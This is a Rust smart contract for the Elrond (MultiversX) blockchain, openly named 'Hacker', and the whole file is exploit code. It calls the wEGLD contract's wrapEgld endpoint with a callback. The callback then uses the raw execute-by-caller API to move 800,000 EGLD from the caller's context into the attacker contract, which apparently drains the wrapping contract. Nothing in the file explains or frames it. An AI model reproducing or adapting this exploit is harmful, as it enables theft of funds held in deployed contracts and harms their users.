#![no_std]
#![feature(generic_associated_types)]

elrond_wasm::imports!();
elrond_wasm::derive_imports!();

#[elrond_wasm::contract]
pub trait Hacker {
  #[init]
  fn init(&self) {}

  #[payable("*")]
  #[endpoint(wrapEgld)]
  fn wrap_egld(
    &self,
    #[payment_token] token_id: TokenIdentifier,
    #[payment_amount] token_amount: BigUint,
    wegld_address: ManagedAddress
  ) {
    let _ = self.wegld_proxy(wegld_address)
      .wrap_egld(
        token_id,
        token_amount,
        OptionalValue::Some(ManagedBuffer::from(b"wrap_egld_callback"))
      )
      .execute_on_dest_context();
  }

  #[payable("*")]
  #[endpoint(wrap_egld_callback)]
  fn wrap_egld_callback(&self) {
    let value = BigUint::from(800_000u32) * BigUint::from(10u32).pow(18u32);
    let arg_buffer = ManagedArgBuffer::new_empty();
    Self::Api::send_api_impl().execute_on_dest_context_by_caller_raw(
      self.blockchain().get_gas_left() / 2,
      &self.blockchain().get_sc_address(),
      &value,
      &ManagedBuffer::from(b"receive_funds"),
      &arg_buffer,
    );
  }

  #[payable("*")]
  #[endpoint(receive_funds)]
  fn receive_funds(&self) {}

  #[proxy]
  fn wegld_proxy(&self, to: ManagedAddress) -> wegld::Proxy<Self::Api>;
}

pub mod wegld {
  elrond_wasm::imports!();
  elrond_wasm::derive_imports!();

  #[elrond_wasm::proxy]
  pub trait Wegld {
    #[payable("EGLD")]
    #[endpoint(wrapEgld)]
    fn wrap_egld(
      &self,
      #[payment_token] token_id: TokenIdentifier,
      #[payment_amount] amount: BigUint,
      #[var_args] opt_accept_funds_func: OptionalValue<ManagedBuffer>,
    );
  }
}
